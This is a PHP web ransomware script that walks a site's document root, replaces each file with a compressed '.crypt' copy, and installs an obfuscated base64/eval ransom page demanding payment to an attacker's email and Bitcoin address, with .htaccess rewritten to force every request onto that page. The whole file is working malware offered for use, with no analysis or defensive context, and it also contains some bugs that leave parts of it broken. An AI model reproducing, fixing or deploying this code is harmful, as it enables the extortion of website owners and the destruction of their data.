<?php
/**
 * 
 */
class Ransom
{
	public $dir;
	public $script;
	
	function __construct($dir, $script)
	{
		$this->dir = $dir;
		$this->script = $script;
	}

	public function encrypFile($filename, $script)
	{
		if (strpos($filename, ".crypt") !== false) {
			return;
		}

		file_put_contents($filename . ".crypt", gzdeflate(file_get_contents($filename, 9)));
		copy(".htaccess", ".htaccess.backup");

		$a = str_replace("gomen", md5($_POST['pass']), $script);
		$b = str_replace('mymail@gmail.com', $_POST['email'], $a);
		$c = str_replace('hello', $_POST['btc'], $b);
		$d = str_replace('$3', '$' .$_POST['price'], $c);

		$dec = $d;
		$data = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
		$handle = fopen("index.php", "w");
		fwrite($handle, $data);
		fclose($handle);

		$htaccess = "DirectoryIndex index.php\n
ErrorDocument 403 /index.php\n
ErrorDocument 404 /index.php\n
ErrorDocument 500 /index.php\n";

		$handle1 = fopen(".htaccess", "w");
		fwrite($handle1, $htaccess);
		fclose($htaccess);

		print($this->filename . "Encrypted <br>");
	}

	public function encrypDir($dir)
	{
		$files = array_diff(scandir($dir), array(".", ".."));
		foreach ($files as $key => $value) {
			if (is_dir($dir .DIRECTORY_SEPARATOR. $value)) {
				$this->encrypDir($$dir .DIRECTORY_SEPARATOR. $value);
			} else {
				$this->encrypFile($dir .DIRECTORY_SEPARATOR. $value, $this->script);
			}
		}
	}
}

$script = base64_decode('JGlucHV0ID0gJF9QT1NUWydwYXNzJ107CgkJJHBhc3MgPSAiZ29tZW4iOwoJCWlmKGlzc2V0KCRpbnB1dCkpIHsKCQkJaWYobWQ1KCRpbnB1dCkgPT0gJHBhc3MpIHsKCQkJCWZ1bmN0aW9uIGRlY2ZpbGUoJGZpbGVuYW1lKXsKCQkJCQlpZiAoc3RycG9zKCRmaWxlbmFtZSwgJy5jcnlwdCcpID09PSBGQUxTRSkgewoJCQkJCQlyZXR1cm47CgkJCQkJfQoJCQkJCSRkZWNyeXB0ZWQgPSBnemluZmxhdGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGVuYW1lKSk7CgkJCQkJZmlsZV9wdXRfY29udGVudHMoc3RyX3JlcGxhY2UoJy5jcnlwdCcsICcnLCAkZmlsZW5hbWUpLCAkZGVjcnlwdGVkKTsKCQkJCQl1bmxpbmsoJ2NyeXB0LnBocCcpOwoJCQkJCXVubGluaygnLmh0YWNjZXNzJyk7CgkJCQkJdW5saW5rKCRmaWxlbmFtZSk7CgkJCQkJZWNobyAiJGZpbGVuYW1lIERlY3J5cHRlZCAhISE8YnI+IjsKCQkJCX0KCgkJCQlmdW5jdGlvbiBkZWNkaXIoJGRpcil7CgkJCQkJJGZpbGVzID0gYXJyYXlfZGlmZihzY2FuZGlyKCRkaXIpLCBhcnJheSgnLicsICcuLicpKTsKCQkJCQlmb3JlYWNoKCRmaWxlcyBhcyAkZmlsZSkgewoJCQkJCQlpZihpc19kaXIoJGRpci4iLyIuJGZpbGUpKXsKCQkJCQkJCWRlY2RpcigkZGlyLiIvIi4kZmlsZSk7CgkJCQkJCX1lbHNlIHsKCQkJCQkJCWRlY2ZpbGUoJGRpci4iLyIuJGZpbGUpOwoJCQkJCQl9CgkJCQkJfQoJCQkJfQoKCQkJCWRlY2RpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsKCQkJCWVjaG8gIjxicj5XZWJyb290IERlY3J5cHRlZDxicj4iOwoJCQkJdW5saW5rKCRfU0VSVkVSWydQSFBfU0VMRiddKTsKCQkJCXVubGluaygnLmh0YWNjZXNzJyk7CgkJCQljb3B5KCdodGFiYWNrdXAnLCcuaHRhY2Nlc3MnKTsKCQkJCWVjaG8gJ1N1Y2Nlc3MgISEhJzsKCQkJfSBlbHNlIHsKCQkJCWVjaG8gJ0ZhaWxlZCBQYXNzd29yZCAhISEnOwoJCQl9CgkJCWV4aXQoKTsKCQl9CgkJPz4KCQk8Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPgoJCQk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIj4KCQkJPGJyPgoJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRGVjcnlwdCI+CgkJPC9mb3JtPg==');

$main = new Ransom(getcwd(), $script);

if (isset($_POST['pass'])) {
	copy('index.php', $_SERVER['DOCUMENT_ROOT'] . '/index.php');
	copy('.htaccess', $_SERVER['DOCUMENT_ROOT'] . '.htaccess');
	copy($_SERVER['DOCUMENT_ROOT'] . '.htaccess', $_SERVER['DOCUMENT_ROOT'] . '.htabackup');

	if (isset($_POST['pass'])) {
		$main->encrypDir($_SERVER['DOCUMENT_ROOT']);
	}
}

?>
	<form enctype="multipart/form-data" method="post">
		<input type="text" name="pass" placeholder="Input Password" >
		<input type="text" name="email" placeholder="Your Email" >
		<input type="text" name="price" placeholder="Price Decrypt" >
		<input type="submit" class="input" value="Lock Site">
	</form>
